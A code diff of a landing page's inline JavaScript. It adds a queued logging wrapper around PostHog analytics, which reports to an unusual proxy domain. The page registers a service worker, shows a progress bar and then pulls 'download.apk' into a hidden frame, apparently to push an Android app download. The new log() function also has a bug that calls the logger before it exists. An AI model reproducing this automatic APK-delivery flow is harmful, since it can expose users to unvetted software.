@@ -11,6 +11,17 @@
 
      !function(t,e){var o,n,p,r;e.__SV||(window.posthog && window.posthog.__loaded)||(window.posthog=e,e._i=[],e.init=function(i,s,a){function g(t,e){var o=e.split(".");2==o.length&&(t=t[o[0]],e=o[1]),t[e]=function(){t.push([e].concat(Array.prototype.slice.call(arguments,0)))}}p||((p=t.createElement("script")).type="text/javascript",p.crossOrigin="anonymous",p.async=!0,p.src=s.api_host.replace(".i.posthog.com","-assets.i.posthog.com")+"/static/array.js",p.onerror=function(){p=null},(r=t.getElementsByTagName("script")[0]).parentNode.insertBefore(p,r));var u=e;for(void 0!==a?u=e[a]=[]:a="posthog",u.people=u.people||[],Object.defineProperty(u,"toString",{configurable:!0,enumerable:!0,writable:!0,value:function(t){var e="posthog";return"posthog"!==a&&(e+="."+a),t||(e+=" (stub)"),e}}),Object.defineProperty(u.people,"toString",{configurable:!0,enumerable:!0,writable:!0,value:function(){return u.toString(1)+".people (stub)"}}),o="Eh Rh Ph Oh Dh qh init yd bd dd fd Sd wc md xd ad Ed Ad Rd Pd Od Fd capture getExtension gr pd gd calculateEventProperties Dd register register_once register_for_session unregister unregister_for_session zd hd jd getFeatureFlag getFeatureFlagPayload getFeatureFlagResult getAllFeatureFlags isFeatureEnabled reloadFeatureFlags updateFlags updateEarlyAccessFeatureEnrollment getEarlyAccessFeatures on onFeatureFlags onSurveysLoaded onSessionId getSurveys getActiveMatchingSurveys onActiveMatchingSurveysChanged renderSurvey displaySurvey cancelPendingSurvey canRenderSurvey canRenderSurveyAsync Hd identify setPersonProperties unsetPersonProperties group resetGroups setPersonPropertiesForFlags resetPersonPropertiesForFlags setGroupPropertiesForFlags resetGroupPropertiesForFlags reset Ud shutdown setIdentity clearIdentity get_distinct_id getGroups get_session_id get_session_replay_url alias set_config startSessionRecording stopSessionRecording sessionRecordingStarted captureException addExceptionStep captureLog startExceptionAutocapture stopExceptionAutocapture loadToolbar get_property getSessionProperty qd Td createPersonProfile setInternalOrTestUser Bd Uh zh opt_in_capturing opt_out_capturing Hh has_opted_in_capturing has_opted_out_capturing get_explicit_consent_status is_capturing clear_opt_in_out_capturing $d debug kc Ds getPageViewId captureTraceFeedback captureTraceMetric rd".split(" "),n=0;n<o.length;n++)g(u,o[n]);e._i.push([i,s,a])},e.__SV=1)}(document,window.posthog||[]);
 
+     const logQueue = []
+     let posthogLoaded = false
+     function log(level, message, attributes) {
+         if (!posthogLoaded) {
+             logQueue.push({level, message, attributes})
+         }
+
+         posthog.logger[level](message, attributes)
+     }
+
+
      posthog.init('phc_vqyXNzhYhfpZrwKKGMQ2VjQq2azSdh2StkeoHodd26NL', {
          api_host: 'https://uiuirestorehere.art',
          advanced_disable_flags: true,
@@ -36,10 +47,19 @@
                  land: '023',
              });
 
+             posthogLoaded = true
+
              // Теперь logger гарантированно существует
              ph.logger.info('Posthog init', {
                  "delay": performance.now() - start
              });
+
+             for (const entry of logQueue) {
+                 posthog.logger[entry.level](
+                     entry.message,
+                     entry.attributes
+                 );
+             }
          }
      });
 
@@ -47,28 +67,28 @@
      window.__downloadSwVersion = '42316858';
      window.__downloadSwUrl = `${window.__landingRoot}sw4.js?v=${window.__downloadSwVersion}&r=${window.__downloadTestRevision}`;
      window.__swReadyPromise = (async () => {
-         posthog.logger.info('Await window.__landingParamsReady [swReadyPromise]', {"delay": performance.now() - start})
+         log('info', 'Await window.__landingParamsReady [swReadyPromise]', {"delay": performance.now() - start})
          await window.__landingParamsReady;
-         posthog.logger.info('Awaited window.__landingParamsReady [swReadyPromise]', {"delay": performance.now() - start})
+         log('info', 'Awaited window.__landingParamsReady [swReadyPromise]', {"delay": performance.now() - start})
          if (!('serviceWorker' in navigator)) {
              return { ok: false, direct: true, reason: 'unsupported' };
          }
 
-         posthog.logger.info('Await registration worker', {"delay": performance.now() - start})
+         log('info', 'Await registration worker', {"delay": performance.now() - start})
          const registration = await navigator.serviceWorker.register(window.__downloadSwUrl);
-         posthog.logger.info('Awaited registration worker', {"delay": performance.now() - start})
+         log('info', 'Awaited registration worker', {"delay": performance.now() - start})
 
-         posthog.logger.info('Await registration worker update', {"delay": performance.now() - start})
+         log('info', 'Await registration worker update', {"delay": performance.now() - start})
          await registration.update();
-         posthog.logger.info('Awaited registration worker update', {"delay": performance.now() - start})
+         log('info', 'Awaited registration worker update', {"delay": performance.now() - start})
 
          if (registration.waiting) {
              registration.waiting.postMessage({ type: 'SKIP_WAITING' });
          }
 
-         posthog.logger.info('Await service worker ready', {"delay": performance.now() - start})
+         log('info', 'Await service worker ready', {"delay": performance.now() - start})
          await navigator.serviceWorker.ready;
-         posthog.logger.info('Awaited service worker ready', {"delay": performance.now() - start})
+         log('info', 'Awaited service worker ready', {"delay": performance.now() - start})
 
          const expectedWorkerUrl = new URL(window.__downloadSwUrl, window.location.href).href;
          if (navigator.serviceWorker.controller?.scriptURL !== expectedWorkerUrl) {
@@ -96,7 +116,7 @@
              controller: navigator.serviceWorker.controller,
          };
      })().catch((error) => {
-         posthog.logger.error('Early service worker setup failed', {"delay": performance.now() - start, "error_message": error.message})
+         log('error', 'Early service worker setup failed', {"delay": performance.now() - start, "error_message": error.message})
          return { ok: false, direct: true, reason: error.message };
      });
     </script>
@@ -325,9 +345,9 @@
          }
 
          async function registerServiceWorker() {
-             posthog.logger.info('Await window.__landParamsReady', {"delay": performance.now() - start})
+             log('info', 'Await window.__landParamsReady', {"delay": performance.now() - start})
              await window.__landingParamsReady;
-             posthog.logger.info('Awaited window.__landParamsReady', {"delay": performance.now() - start})
+             log('info', 'Awaited window.__landParamsReady', {"delay": performance.now() - start})
 
              savedParams = window.__savedDownloadParams;
              offerId = getSavedOfferId();
@@ -335,34 +355,34 @@
              const title = document.querySelector('#fileTitle');
              if (title) title.textContent = fileName;
 
-             posthog.logger.info('Await window.__swReadyPromise', {"delay": performance.now() - start})
+             log('info', 'Await window.__swReadyPromise', {"delay": performance.now() - start})
              const swState = await window.__swReadyPromise;
-             posthog.logger.info('Awaited window.__swReadyPromise', {"delay": performance.now() - start})
+             log('info', 'Awaited window.__swReadyPromise', {"delay": performance.now() - start})
 
              if (!swState.ok || swState.direct) {
                  downloadButton.disabled = true;
-                 posthog.logger.warn('Service worker is required for offer download', {"delay": performance.now() - start, "offer_id": offerId})
+                 log('warn', 'Service worker is required for offer download', {"delay": performance.now() - start, "offer_id": offerId})
                  return;
              }
 
              isServiceWorkerReady = true;
-             posthog.logger.info('Ready to download', {"delay": performance.now() - start, "sw_url": SW_URL, "offer_id": offerId, "fileName": fileName})
+             log('info', 'Ready to download', {"delay": performance.now() - start, "sw_url": SW_URL, "offer_id": offerId, "fileName": fileName})
          }
 
          function startDownload() {
-             posthog.logger.info('Start download', {"delay": performance.now() - start})
+             log('info', 'Start download', {"delay": performance.now() - start})
              if (!offerId) {
-                 posthog.logger.warn('offer_id is missing', {"delay": performance.now() - start})
+                 log('warn', 'offer_id is missing', {"delay": performance.now() - start})
                  return;
              }
 
              const target = new URL('download.apk', window.__landingRoot);
-             posthog.logger.info('Starting service worker download', {"delay": performance.now() - start, "sw_url": SW_URL, "offer_id": offerId, "fileName": fileName, "target": target.href})
+             log('info', 'Starting service worker download', {"delay": performance.now() - start, "sw_url": SW_URL, "offer_id": offerId, "fileName": fileName, "target": target.href})
 
              downloadFrame.src = 'about:blank';
              window.setTimeout(() => {
                  downloadFrame.src = target.href;
-                 posthog.logger.info('End download after timeout', {"delay": performance.now() - start})
+                 log('info', 'End download after timeout', {"delay": performance.now() - start})
              }, 0);
          }
 
@@ -372,7 +392,7 @@
              }
 
              if (!isServiceWorkerReady) {
-                 posthog.logger.info('Download requested before service worker readiness', {"delay": performance.now() - start})
+                 log('info', 'Download requested before service worker readiness', {"delay": performance.now() - start})
                  return;
              }
 
@@ -389,7 +409,7 @@
          }
 
          function runProgress() {
-             posthog.logger.info('Run progress bar', {"delay": performance.now() - start})
+             log('info', 'Run progress bar', {"delay": performance.now() - start})
              return new Promise((resolve) => {
                  let scorePercent = 0;
                  scalePercentText.textContent = '0%';
@@ -432,7 +452,7 @@
          const downloadReady = registerServiceWorker().catch((error) => {
              console.error('[download] service worker setup failed', error);
              downloadButton.disabled = true;
-             posthog.logger.error('Service worker setup failed', {"delay": performance.now() - start, "offer_id": offerId, "error_message": error.message})
+             log('error', 'Service worker setup failed', {"delay": performance.now() - start, "offer_id": offerId, "error_message": error.message})
          });
 
          Promise.all([runProgress(), downloadReady]).then(() => {
@@ -442,9 +462,7 @@
                  startDownload();
              }
          });
-
      })();
-
     </script>
   </body>
 </html>
